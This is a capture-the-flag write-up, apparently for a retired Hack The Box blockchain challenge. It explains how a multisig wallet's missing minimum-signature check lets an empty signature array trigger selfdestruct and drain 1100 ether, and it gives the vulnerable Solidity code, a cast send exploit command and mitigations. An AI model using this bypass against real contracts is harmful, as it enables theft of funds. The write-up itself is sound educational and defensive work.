---
challenge: Funds Secured
type: Blockchain
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, multisig, access-control, crowdfunding]
---

# Funds Secured — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

A multisig wallet requires six council signatures to close a campaign, but does not validate a minimum list length. Sending an empty list skips the loop and executes `closeCampaign`, destroying the contract and transferring the funds.

## Prompt and surface

- Blockchain, Easy, retired.
- `Campaign.sol`, `Setup.sol` and the ECDSA library are provided.
- The instance exposes RPC, the player key and the `Setup`, `Crowdfunding` and `CouncilWallet` addresses.

```bash
nc <HOST> <PORT>
cast call <SETUP> "isSolved() (bool)"
```

## Reconnaissance

- `Crowdfunding` holds 1100 ether and only its owner can close the campaign.
- The owner is `CouncilWallet`.
- `CouncilWallet.closeCampaign(bytes[] signatures, address to, address crowdfundingContract)` verifies signatures from the eleven members.
- `isSolved` checks that the `Crowdfunding` balance is zero.

## Contract analysis

```solidity
function closeCampaign(bytes[] memory signatures, address to, address payable crowdfundingContract) public {
    address[] memory voters = new address[] (signatures.length);
    bytes32 data = keccak256(abi.encode(to));

    for (uint256 i = 0; i < signatures.length; i++) {
        address signer = data.toEthSignedMessageHash().recover(signatures[i]);
        require(signer != address(0), "Invalid signature");
        require(_contains(councilMembers, signer), "Not council member");
        require(!_contains(voters, signer), "Duplicate signature");
        voters[i] = signer;
        if (i > 5) break;
    }

    Crowdfunding(crowdfundingContract).closeCampaign(to);
}
```

The threshold check is implicit in the loop. If `signatures.length == 0`, the loop never runs and the final call still executes.

## Root cause

The wallet mistakes “iterating signatures” for “requiring six signatures”. There is no explicit `signatures.length >= 6` check and no binding between signatures, campaign and chain. The `to` address and crowdfunding contract are caller-controlled.

## Exploitation

1. Call `closeCampaign` on `CouncilWallet`.
2. Pass an empty signature array.
3. Use `CouncilWallet` as recipient and `Crowdfunding` as the contract.
4. `selfdestruct` empties the balance and `isSolved` becomes `true`.

```bash
cast send <WALLET> \
  "closeCampaign(bytes[],address,address)" \
  '[]' <WALLET> <CROWDFUNDING> \
  --private-key <PRIVATE_KEY>
```

## Evidence

- Initial `Crowdfunding` balance.
- Call with an empty array.
- Final zero balance and `isSolved` true.
- Redacted flag.

## Lessons learned

- Looping over a list does not implement a threshold.
- `to` and `contract` parameters are part of the attack surface too.
- `selfdestruct` must not be reachable through an incomplete check.

## Mitigations and detection

- Explicitly require the minimum number of unique signatures.
- Bind the contract address and chain into the signed message.
- Avoid `selfdestruct` in business logic.
- Monitor campaign closures with empty lists or unexpected parameters.

## References

- <https://www.hackthebox.com/challenges/Funds%20Secured>
- <https://docs.openzeppelin.com/contracts/5.x/api/utils/cryptography#ECDSA>
- <https://swcregistry.io/docs/SWC-105>
